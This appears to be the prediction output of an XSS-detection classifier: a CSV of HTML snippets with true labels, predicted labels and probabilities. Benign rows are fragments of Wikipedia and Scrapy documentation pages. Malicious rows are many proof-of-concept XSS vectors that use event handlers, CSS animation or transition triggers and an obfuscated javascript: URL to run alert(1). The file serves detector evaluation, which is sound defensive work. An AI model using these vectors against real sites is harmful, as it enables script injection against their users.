Unnamed: 0,payload,label,predicted_label,probability
3244,"<li><a href=""#CITEREFMoravec1988"">Moravec 1988 </a>, p.&#160;3 </li> </ul>",0,0,0.00014286152
7144,"	 <div style=""padding:0em 0.25em"">",0,0,0.0065485397
6817,"<li class=""toclevel-2 tocsection-39""><a href=""#Cybersecurity""><span class=""tocnumber"">7.4 ",0,0,0.00012418805
8650,"<del onmouseup=""alert(1)"">test</del>",1,1,0.9953379
1672,"<li><a href=""/wiki/Philosophy_of_artificial_intelligence"" title=""Philosophy of artificial intelligence"">Philosophy of artificial intelligence </a> </li>",0,0,0.00018214124
10235,"<q onpaste=""alert(1)"" contenteditable>test</q>",1,1,0.9966297
10600,"<summary onbeforecopy=""alert(1)"" contenteditable>test</summary>",1,1,0.9982275
7482,"<samp draggable=""true"" ondragenter=""alert(1)"">test</samp>",1,1,0.99780566
5404,"    <input type=""hidden"" name=""area"" value=""default"" />",0,0,3.3974302e-05
11840,	 </span> </li>,0,0,4.039223e-05
7723,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,0,2.0622756e-05
6947,"<dt onmouseup=""alert(1)"">test</dt>",1,1,0.99765307
7304,"<li id=""cite_note-292""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-292"">^ </a> </b> ",0,0,0.0002066166
2078,"<style>:target {color:red;}</style><var id=x style=""transition:color 1s"" ontransitionend=alert(1)></var>",1,1,0.9979163
9080,<article onpointerenter=alert(1)>XSS</article>,1,1,0.99724734
1824,"<meter onbeforepaste=""alert(1)"" contenteditable>test</meter>",1,1,0.998184
8199,<svg><menuitem onload=alert(1)></menuitem>,1,1,0.99757254
6769,"<IMG SRC=""jav&#x09;ascript:alert('');"">",1,1,0.99639624
6955, ,0,0,0.0009942207
9598,"Second <a href=""/wiki/AI_winter"" title=""AI winter"">AI winter </a>:",0,0,0.009549751
12738,	 </span></a></dt><dd>Customize how pages get requested and downloaded.</dd>,0,0,3.6465142e-05
6314,"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/settings.html"">Settings</a></li>",0,0,0.00015158356
2368,<del onpointerenter=alert(1)>XSS</del>,1,1,0.99566984
3882,        <dt>On Read the Docs</dt>,0,0,5.009574e-05
13580,"<style oncontextmenu=""alert(1)"">test</style>",1,1,0.9978141
6100,"  <form id=""rtd-search-form"" class=""wy-form"" action=""search.html"" method=""get"">",0,0,6.0996288e-05
8373,<s id=x tabindex=1 onfocusin=alert(1)></s>,1,1,0.99076575
11,<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>,1,1,0.9967368
13656,"	 <div style=""padding:0em 0.25em"">",0,0,0.0065485397
6511,"  <div class=""wy-grid-for-nav"">",0,0,0.0001151284
4983,"<rt draggable=""true"" ondragstart=""alert(1)"">test</rt>",1,1,0.99786574
1870,<area id=x tabindex=1 onbeforedeactivate=alert(1)></area><input autofocus>,1,1,0.99713033
13333,"<wbr draggable=""true"" ondragleave=""alert(1)"">test</wbr>",1,1,0.9956934
1868,	 </span> </li>,0,0,4.039223e-05
5682,"<li><img alt=""WikiProject"" src=""//upload.wikimedia.org/wikipedia/commons/thumb/3/37/People_icon.svg/16px-People_icon.svg.png"" decoding=""async"" title=""WikiProject"" width=""16"" height=""16"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/3/37/People_icon.svg/24px-People_icon.svg.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/3/37/People_icon.svg/32px-People_icon.svg.png 2x"" data-file-width=""100"" data-file-height=""100"" /><b><a href=""/wiki/Wikipedia:WikiProject_Computer_science"" title=""Wikipedia:WikiProject Computer science"">WikiProject </a> </b> </li>",0,0,1.5623064e-05
10631,<data id=x tabindex=1 onbeforeactivate=alert(1)></data>,1,1,0.9971009
9320,"<button draggable=""true"" ondragleave=""alert(1)"">test</button>",1,1,0.9982465
6721,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,0,2.1147165e-05
4078,"<li><a href=""/wiki/Glossary_of_robotics"" title=""Glossary of robotics"">Robotics </a> </li>",0,0,0.00019932011
12737,"<template onmouseenter=""alert(1)"">test</template>",1,1,0.9980378
9653,"<dd onmouseenter=""alert(1)"">test</dd>",1,1,0.9974857
5658,"<li><a href=""/wiki/Elon_Musk"" title=""Elon Musk"">Elon Musk </a> </li>",0,0,0.0001767519
13407,<span id=x tabindex=1 ondeactivate=alert(1)></span><input id=y autofocus>,1,1,0.99616146
680, </p>,0,0,0.00027944767
4320,"<li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, p.&#160;153 </li>",0,0,0.00013826357
4909," </tr><tr><th style=""padding:0.1em"">",0,1,0.90979385
1584,"<figure onmouseout=""alert(1)"">test</figure>",1,1,0.99318147
2031,"<li><a href=""/wiki/Multimedia_database"" title=""Multimedia database"">Multimedia information system </a> </li>",0,0,0.00011112211
1140,"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Tech+Insider&amp;rft.atitle=The+mysterious+artificial+intelligence+company+Elon+Musk+invested+in+is+developing+game-changing+smart+computers&amp;rft_id=http%3A%2F%2Fwww.techinsider.io%2Fmysterious-artificial-intelligence-company-elon-musk-investment-2015-10&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,0,2.173764e-05
8899,"<xmp draggable=""true"" ondrag=""alert(1)"">test</xmp>",1,1,0.99792093
12525,	 </span>,0,0,6.0303642e-05
5139,"<li><a href=""/wiki/Heinz_von_Foerster"" title=""Heinz von Foerster"">Heinz von Foerster </a> </li>",0,0,0.00015382898
2137,	 </span> 2019 ,0,0,4.3054803e-05
2918, </li>,0,0,0.00012413738
9869,"<html draggable=""true"" ondragend=""alert(1)"">test</html>",1,1,0.9935825
9218,<aside id=x tabindex=1 onactivate=alert(1)></aside>,1,1,0.99382085
13135, </li>,0,0,0.00012413738
1463,"<li><a href=""/wiki/New_mysterianism"" title=""New mysterianism"">New mysterianism </a> </li>",0,0,0.00012673631
4232,	 </span> 2014 ,0,0,4.331408e-05
10818,	 </span>,0,0,6.0303642e-05
2020,	 </span></a></dt><dd>Learn how to contribute to the Scrapy project.</dd>,0,0,3.3134755e-05
11428,"<head onmousedown=""alert(1)"">test</head>",1,1,0.99423933
4318,<span onpointerdown=alert(1)>XSS</span>,1,1,0.99755996
5134,<table onpointerup=alert(1)>XSS</table>,1,1,0.99744266
4878,<input3 onpointerover=alert(1)>XSS</input3>,1,1,0.9953834
3982,"<h3><span class=""mw-headline"" id=""History_of_AI"">History of AI ",0,0,0.00042396513
575,"<style>@keyframes x{}</style><address style=""animation-name:x"" onanimationend=""alert(1)""></address>",1,1,0.9975349
3420,<aside onpointermove=alert(1)>XSS</aside>,1,1,0.99693525
802,"<ruby onmouseleave=""alert(1)"">test</ruby>",1,1,0.99802285
10324,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> See also <a rel=""nofollow"" class=""external text"" href=""http://consc.net/papers/facing.html"">this link </a> ",0,0,2.1511169e-05
5890,"<small onpaste=""alert(1)"" contenteditable>test</small>",1,1,0.9960524
8733,"<object onkeypress=""alert(1)"" contenteditable>test</object>",1,1,0.99828845
8213,"<li><a href=""#CITEREFBrooks1990"">Brooks 1990 </a> </li>",0,0,0.0001482327
13477, </li>,0,0,0.00012413738
4715,<plaintext onfocusout=alert(1) tabindex=1 id=x></plaintext><input autofocus>,1,1,0.9857263
287,"<li><a href=""/wiki/Computational_geometry"" title=""Computational geometry"">Computational geometry </a> </li> </ul>",0,0,0.00010552502
142,<optgroup onpointerover=alert(1)>XSS</optgroup>,1,1,0.9985212
11841,"<li id=""cite_note-Optimization_search-190""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Optimization_search_190-0"">^ </a> </b> ",0,0,0.00011311264
2002,"<dl onmouseover=""alert(1)"">test</dl>",1,1,0.9958656
4297,"<dt><a class=""reference internal"" href=""topics/link-extractors.html""><span class=""doc"">Link Extractors",0,0,0.00055115635
13165,"<div draggable=""true"" contenteditable>drag me</div><meta ondragover=alert(1) contenteditable>drop here</meta>",1,1,0.995677
5094,"<style draggable=""true"" ondragleave=""alert(1)"">test</style>",1,1,0.9974748
2219,<svg><code onload=alert(1)></code>,1,1,0.9971668
4126,<p onpointerout=alert(1)>XSS</p>,1,1,0.9969657
6185,"<track onmouseout=""alert(1)"">test</track>",1,1,0.99814296
6540,"<div onclick=""alert(1)"">test</div>",1,1,0.96616346
390,<slot id=x tabindex=1 ondeactivate=alert(1)></slot><input id=y autofocus>,1,1,0.9952766
2830,DATASRC=#I DATAFLD=C DATAFORMATAS=HTML,1,1,0.996945
2013,"<style>@keyframes x{}</style><slot style=""animation-name:x"" onanimationstart=""alert(1)""></slot>",1,1,0.99751383
7460,<menu id=x tabindex=1 onactivate=alert(1)></menu>,1,1,0.99638236
5495,<tbody onpointermove=alert(1)>XSS</tbody>,1,1,0.9983943
467,<svg><menu onload=alert(1)></menu>,1,1,0.99743813
2827,<ins onfocusout=alert(1) tabindex=1 id=x></ins><input autofocus>,1,1,0.9937546
8666,<xmp id=x tabindex=1 onfocusin=alert(1)></xmp>,1,1,0.99684244
6819,	 </span></a></dt><dd>Get answers to most frequently asked questions.</dd>,0,0,3.998942e-05
10750,"	 </span> <span class=""reference-text"">Alex Graves, Santiago Fernandez, Faustino Gomez, and <a href=""/wiki/J%C3%BCrgen_Schmidhuber"" title=""Jürgen Schmidhuber"">Jürgen Schmidhuber </a> (2006). Connectionist temporal classification: Labelling unsegmented sequence data with recurrent neural nets. Proceedings of ICML'06, pp. 369–376. ",0,0,0.00080272584
7145,<svg><span onload=alert(1)></span>,1,1,0.9972998
5336,<animate onpointerenter=alert(1)>XSS</animate>,1,1,0.99778974
3451,	 </span></a></dt><dd>Understand Scrapy versioning and API stability.</dd>,0,0,2.544463e-05
12521,"<dt><a class=""reference internal"" href=""topics/shell.html""><span class=""doc"">Scrapy shell",0,0,0.0009722331
11991,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,0,2.1147165e-05
3809,	 </span> </a> </li>,0,0,3.6811532e-05
9756,<svg><title onload=alert(1)></title>,1,1,0.9966293
10112,	 </span>,0,0,6.0303642e-05
11960,<figure onfocusout=alert(1) tabindex=1 id=x></figure><input autofocus>,1,1,0.9877908
7142,"<div draggable=""true"" contenteditable>drag me</div><title ondragover=alert(1) contenteditable>drop here</title>",1,1,0.99565196
7295,<ul>,0,0,0.0012222066
12814,"<li id=""cite_note-scholarpedia-249""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-scholarpedia_249-0"">^ </a> </b> ",0,0,0.00025179607
12791,	 </span>,0,0,6.0303642e-05
12180,"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=22"" title=""Edit section: Embodied intelligence"">edit </a><span class=""mw-editsection-bracket"">] ",0,0,2.2008242e-05
12423,"<textarea onmouseenter=""alert(1)"">test</textarea>",1,1,0.9984166
1324,<slot id=x tabindex=1 onfocusin=alert(1)></slot>,1,1,0.99489164
4174,"<dl oncontextmenu=""alert(1)"">test</dl>",1,1,0.99593717
10083, </li>,0,0,0.00012413738
3706,"<section onbeforepaste=""alert(1)"" contenteditable>test</section>",1,1,0.99737585
7310,"	 </span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""https://www.scientificamerican.com/article/can-neural-network-comput/"">""Can neural network computers learn from experience, and if so, could they ever become what we would call 'smart'?"" </a>. <i>Scientific American </i>. 2018<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">24 March ",0,0,2.0533407e-05
8496,"<dd>""Every aspect of learning or any other feature of intelligence can be so precisely described that a machine can be made to simulate it."" This conjecture was printed in the proposal for the Dartmouth Conference of 1956.<sup id=""cite_ref-Dartmouth_proposal_352-0"" class=""reference""><a href=""#cite_note-Dartmouth_proposal-352"">&#91;341&#93; </a> </sup> </dd> </dl>",0,0,0.00037165923
12682,"<tt oncopy=""alert(1)"" contenteditable>test</tt>",1,1,0.9978741
8244,<tfoot id=x tabindex=1 onactivate=alert(1)></tfoot>,1,1,0.9971894
8886,"<select onmouseleave=""alert(1)"">test</select>",1,1,0.99615496
8374,<output onpointermove=alert(1)>XSS</output>,1,1,0.99821156
3533,"<li id=""cite_note-FOOTNOTENorvig2012-176""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTENorvig2012_176-0"">^ </a> </b> ",0,0,0.00011780288
2069,"<li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;448–449 </li> </ul>",0,0,0.00013790687
6381,"<li id=""cite_note-358""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-358"">^ </a> </b> ",0,0,0.00021358694
8806,"<svg ondblclick=""alert(1)"">test</svg>",1,1,0.9933963
4328,"<li><a href=""/wiki/Alexander_Lerner"" title=""Alexander Lerner"">Alexander Lerner </a> </li>",0,0,0.00010600731
9534,"<style>:target {color: red;}</style><embed id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></embed>",1,1,0.99786866
6665,"<div draggable=""true"" contenteditable>drag me</div><h1 ondrop=alert(1) contenteditable>drop here</h1>",1,1,0.99563456
7886,<animatetransform onpointerenter=alert(1)>XSS</animatetransform>,1,1,0.9981215
3436,"<hgroup draggable=""true"" ondragend=""alert(1)"">test</hgroup>",1,1,0.9964785
1816,"<header onmousemove=""alert(1)"">test</header>",1,1,0.9963207
1074,"<style>:target {color:red;}</style><option id=x style=""transition:color 1s"" ontransitionend=alert(1)></option>",1,1,0.9979161
7939,"<li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;327–335, 434–435 </li>",0,0,0.00013793069
11573,<ol onpointerup=alert(1)>XSS</ol>,1,1,0.9962887
294,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,0,2.0622756e-05
12006,"<li id=""cite_note-Revival_of_connectionism-172""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Revival_of_connectionism_172-0"">^ </a> </b> ",0,0,0.00011235166
1809,</div>,0,0,0.0019899341
123, </li>,0,0,0.00012413738
4889,"<ol oncopy=""alert(1)"" contenteditable>test</ol>",1,1,0.9960881
12766,"<li id=""cite_note-314""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-314"">^ </a> </b> ",0,0,0.00011367881
2942,"      <div class=""wy-side-scroll"">",0,0,5.2968844e-05
214,"<video onmouseout=""alert(1)"">test</video>",1,1,0.9974246
7028,<menu onpointerover=alert(1)>XSS</menu>,1,1,0.99782294
7729,"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/spiders.html"">Spiders</a></li>",0,0,0.00015212758
4646,"<li id=""cite_note-102""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-102"">^ </a> </b> ",0,0,0.000116894706
2038,"<div role=""navigation"" class=""navbox"" aria-labelledby=""Philosophy_of_science"" style=""padding:3px""><table class=""nowraplinks hlist mw-collapsible autocollapse navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th scope=""col"" class=""navbox-title"" colspan=""2"">",0,0,0.00040585978
6768,"<menuitem onmousedown=""alert(1)"">test</menuitem>",1,1,0.99784005
4647,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><table id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></table>",1,1,0.9974925
9835,"<b onbeforecut=""alert(1)"" contenteditable>test</b>",1,1,0.9967291
10091,"<thead onkeypress=""alert(1)"" contenteditable>test</thead>",1,1,0.99641746
12216,"<datalist draggable=""true"" ondrag=""alert(1)"">test</datalist>",1,1,0.9973537
13069,"	 </span> <span class=""reference-text"">Hasim Sak and Andrew Senior and Francoise Beaufays (2014). Long Short-Term Memory recurrent neural network architectures for large scale acoustic modeling. Proceedings of Interspeech 2014. ",0,0,0.0002949512
12829,<multicol onpointermove=alert(1)>XSS</multicol>,1,1,0.9957741
8954,<base onpointerdown=alert(1)>XSS</base>,1,1,0.9977994
4255,"<li id=""cite_note-58""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-58"">^ </a> </b> ",0,0,0.00021838673
2329,<canvas onpointerover=alert(1)>XSS</canvas>,1,1,0.9978272
8157,"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,0,6.386378e-05
12326,"<li><a href=""/wiki/Automated_retail"" title=""Automated retail"">Retail </a> </li>",0,0,0.00010534012
1853,"<noframes draggable=""true"" ondragend=""alert(1)"">test</noframes>",1,1,0.9979546
7495,<menuitem onpointerover=alert(1)>XSS</menuitem>,1,1,0.9978937
9971,"<b onbeforecopy=""alert(1)"" contenteditable>test</b>",1,1,0.9968612
4183,"<meta onmouseenter=""alert(1)"">test</meta>",1,1,0.9982142
13207,"<style>:target {color:red;}</style><datalist id=x style=""transition:color 1s"" ontransitionend=alert(1)></datalist>",1,1,0.9979153
6765,<animate onpointerleave=alert(1)>XSS</animate>,1,1,0.99771094
1374,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,0,2.0622756e-05
9967,"<strike draggable=""true"" ondragstart=""alert(1)"">test</strike>",1,1,0.9976761
2274,"<style>:target {color:red;}</style><bdi id=x style=""transition:color 1s"" ontransitionend=alert(1)></bdi>",1,1,0.9979042
10653, ,0,0,0.0009942207
10543,<q onpointerup=alert(1)>XSS</q>,1,1,0.9966206
4453, </li>,0,0,0.00012413738
1804,"<li><cite id=""CITEREFHenderson2007"" class=""citation news"">Henderson, Mark (24 April 2007). <a rel=""nofollow"" class=""external text"" href=""http://www.thetimes.co.uk/tto/technology/article1966391.ece"">""Human rights for robots? We're getting carried away"" </a>. <i>The Times Online </i>. London. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=The+Times+Online&amp;rft.atitle=Human+rights+for+robots%3F+We%27re+getting+carried+away&amp;rft.date=2007-04-24&amp;rft.aulast=Henderson&amp;rft.aufirst=Mark&amp;rft_id=http%3A%2F%2Fwww.thetimes.co.uk%2Ftto%2Ftechnology%2Farticle1966391.ece&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,0,1.0184849e-05
11388,"	 </span> <span class=""reference-text""><cite class=""citation journal"">Müller, Vincent C.; Bostrom, Nick (2014). <a rel=""nofollow"" class=""external text"" href=""http://www.sophia.de/pdf/2014_PT-AI_polls.pdf"">""Future Progress in Artificial Intelligence: A Poll Among Experts"" </a> <span class=""cs1-format"">(PDF) ",0,0,2.0523228e-05
1590,"<blink oncontextmenu=""alert(1)"">test</blink>",1,1,0.9949065
8446,    </nav>,0,0,6.6640096e-05
6779,"<basefont onmouseleave=""alert(1)"">test</basefont>",1,1,0.9978859
8356,"<bgsound onmousedown=""alert(1)"">test</bgsound>",1,1,0.9982884
13394,<frameset id=x tabindex=1 onbeforedeactivate=alert(1)></frameset><input autofocus>,1,1,0.99684185
3274,"<h2><span class=""mw-headline"" id=""Tools"">Tools ",0,0,0.0004365043
4207,<colgroup onfocusout=alert(1) tabindex=1 id=x></colgroup><input autofocus>,1,1,0.9973363
4898,<image src=validimage.png onloadstart=alert(1)>,1,1,0.9961934
7959,"<style>:target {transform: rotate(180deg);}</style><title id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></title>",1,1,0.99798673
13572,"<li><a href=""#CITEREFBBC_News2006""><i>BBC News </i> 2006 </a> </li> </ul>",0,0,0.00014978283
8505,<font id=x tabindex=1 onbeforedeactivate=alert(1)></font><input autofocus>,1,1,0.99461275
4722,Uncertain reasoning:,0,1,0.5564736
13605,"<div draggable=""true"" contenteditable>drag me</div><form ondragover=alert(1) contenteditable>drop here</form>",1,1,0.99565566
9746,<sub onblur=alert(1) tabindex=1 id=x></sub><input autofocus>,1,1,0.9971106
11427," </tr><tr><th style=""padding:0.1em"">",0,1,0.90979385
7218,<legend id=x tabindex=1 onactivate=alert(1)></legend>,1,1,0.992545
9657,"<ul><li><a href=""/wiki/Subjectivity"" title=""Subjectivity"">Polycontexturality </a> </li>",0,0,0.00020426759
11478,"<u onbeforecopy=""alert(1)"" contenteditable>test</u>",1,1,0.99561024
6174,"<rtc onkeydown=""alert(1)"" contenteditable>test</rtc>",1,1,0.99768126
10293,<iframe onpointerup=alert(1)>XSS</iframe>,1,1,0.99495375
9887,"<div draggable=""true"" contenteditable>drag me</div><q ondrop=alert(1) contenteditable>drop here</q>",1,1,0.9956466
4777,<data onblur=alert(1) tabindex=1 id=x></data><input autofocus>,1,1,0.9977982
11404,"<li id=""cite_note-Configuration_space-129""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Configuration_space_129-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Configuration_space_129-1""><sup><i><b>b </b> </i> </sup> </a> ",0,0,0.000110270485
10982,"<table class=""box-More_citations_needed_section plainlinks metadata ambox ambox-content ambox-Refimprove"" role=""presentation""><tbody><tr><td class=""mbox-image"">",0,1,0.99460006
6477,"	 </span> <span class=""reference-text""><a href=""#CITEREFRussellNorvig2009"">Russell &amp; Norvig 2009 </a>, p.&#160;2. ",0,0,2.0521622e-05
3803,"<style>:target {transform: rotate(180deg);}</style><dd id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dd>",1,1,0.9979868
10202,"<style>:target {color:red;}</style><html id=x style=""transition:color 1s"" ontransitionend=alert(1)></html>",1,1,0.99790025
10387,"	 </span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""https://www.theguardian.com/technology/2016/feb/16/demis-hassabis-artificial-intelligence-deepmind-alphago"">""The superhero of artificial intelligence: can this genius keep it in check?"" </a>. <i>the Guardian </i>. 16 February 2016<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">26 April ",0,0,2.0533369e-05
5507,"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=73"" title=""Edit section: AI textbooks"">edit </a><span class=""mw-editsection-bracket"">] ",0,0,2.6017875e-05
996,"<frameset onpaste=""alert(1)"" contenteditable>test</frameset>",1,1,0.99747723
2376,"<tt onpaste=""alert(1)"" contenteditable>test</tt>",1,1,0.9979085
5726,"<q onbeforepaste=""alert(1)"" contenteditable>test</q>",1,1,0.9961024
4445,"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;382–387 </li>",0,0,0.00015821659
13521,	 </span> ,0,0,5.1390383e-05
10677,<s onpointerenter=alert(1)>XSS</s>,1,1,0.9972113
4011,"<li><a href=""/wiki/Understanding"" title=""Understanding"">Understanding </a> </li>",0,0,0.00010553992
9960,<blink id=x tabindex=1 onbeforeactivate=alert(1)></blink>,1,1,0.9793651
4653,<samp id=x tabindex=1 onbeforedeactivate=alert(1)></samp><input autofocus>,1,1,0.9967832
10899,      <dl>,0,0,5.217016e-05
12523,"	 </span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""http://www.sciencemag.org/news/2017/07/ai-revolution-science"">""The AI revolution in science"" </a>. <i>Science | AAAS </i>. 5 July 2017<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">7 May ",0,0,2.0533644e-05
11222,"<style>@keyframes slidein {}</style><div style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></div>",1,1,0.9964451
3216,"<style>:target {color: red;}</style><p id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></p>",1,1,0.9978577
1321,<slot onpointerenter=alert(1)>XSS</slot>,1,1,0.99728703
2405,"	<a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=14"" title=""Edit section: Approaches"">edit </a><span class=""mw-editsection-bracket"">] ",0,0,3.0825617e-05
4200,<footer id=x tabindex=1 onfocusin=alert(1)></footer>,1,1,0.99702233
5565,"	 </span> <span class=""reference-text"">",0,0,4.9663875e-05
5923,"<style>@keyframes x{}</style><spacer style=""animation-name:x"" onanimationend=""alert(1)""></spacer>",1,1,0.99752146
810," </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Algorithm"" title=""Algorithm"">Algorithms </a> </th><td class=""navbox-list navbox-even hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,0,5.409216e-05
12222,"<header onmouseup=""alert(1)"">test</header>",1,1,0.9959103
12040, </li>,0,0,0.00012413738
3564,"<li><a href=""#CITEREFHowe1994"">Howe 1994 </a> </li> </ul>",0,0,0.00015534724
2758,"<div class=""div-col columns column-width"" style=""-moz-column-width: 20em; -webkit-column-width: 20em; column-width: 20em;"">",0,0,0.0021841803
8314,"		<div id=""jump-to-nav""> </div>",0,0,4.1739713e-05
1887, </li>,0,0,0.00012413738
8863,"<time ondblclick=""alert(1)"">test</time>",1,1,0.992098
8782,"	 <div style=""padding:0em 0.25em"">",0,0,0.0065485397
902,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,0,2.0622756e-05
12490,"	 <div class=""magnify""><a href=""/wiki/File:ParseTree.svg"" class=""internal"" title=""Enlarge""> </a> </div>A <a href=""/wiki/Parse_tree"" title=""Parse tree"">parse tree </a> represents the <a href=""/wiki/Syntax"" title=""Syntax"">syntactic </a> structure of a sentence according to some <a href=""/wiki/Formal_grammar"" title=""Formal grammar"">formal grammar </a>. </div> </div> </div>",0,0,2.9579258e-05
12428,<img src=validimage.png onloadend=alert(1)>,1,1,0.9946049
7397,"<div role=""note"" class=""hatnote navigation-not-searchable"">Main article: <a href=""/wiki/Natural_language_processing"" title=""Natural language processing"">Natural language processing </a> </div>",0,0,0.0003829288
5794,"<div onpaste=""alert(1)"" contenteditable>test</div>",1,1,0.9960735
11402,"<hr onmouseup=""alert(1)"">test</hr>",1,1,0.99517405
5822,<legend onpointerleave=alert(1)>XSS</legend>,1,1,0.9955745
5645,"<strike onmousemove=""alert(1)"">test</strike>",1,1,0.9978841
4291,"<ul><li><a href=""/wiki/Internet_of_things"" title=""Internet of things"">Internet of things </a> </li> </ul> </li>",0,0,0.00016162795
10508,"<basefont onbeforecopy=""alert(1)"" contenteditable>test</basefont>",1,1,0.9977696
6319,"<dt><a class=""reference internal"" href=""topics/leaks.html""><span class=""doc"">Debugging memory leaks",0,0,0.001310297
5956,<body onwheel=alert(1)>,1,1,0.99327815
9769,"<nav onbeforecut=""alert(1)"" contenteditable>test</nav>",1,1,0.99746037
6377,"          <a href=""#"">Scrapy</a>",0,0,4.7104513e-05
6772,"              <div class=""version"">",0,0,4.7211317e-05
4162,"<header onkeypress=""alert(1)"" contenteditable>test</header>",1,1,0.995627
2990,"<h3><span class=""mw-headline"" id=""Other_sources"">Other sources ",0,0,0.0004930708
9140,"<frameset draggable=""true"" ondragenter=""alert(1)"">test</frameset>",1,1,0.9974449
9876,	 </span> 2020 ,0,0,4.6680452e-05
267,"<style>:target {color:red;}</style><embed id=x style=""transition:color 1s"" ontransitionend=alert(1)></embed>",1,1,0.99791455
10949,"<li><a href=""/wiki/Second-order_cybernetics"" title=""Second-order cybernetics"">Second-order cybernetics </a> </li>",0,0,0.0018994823
11336,	 </span> </h3>,0,0,4.0975585e-05
10121,<b id=x tabindex=1 onactivate=alert(1)></b>,1,1,0.99359125
5900,"      <div class=""wy-nav-content"">",0,0,5.3280866e-05
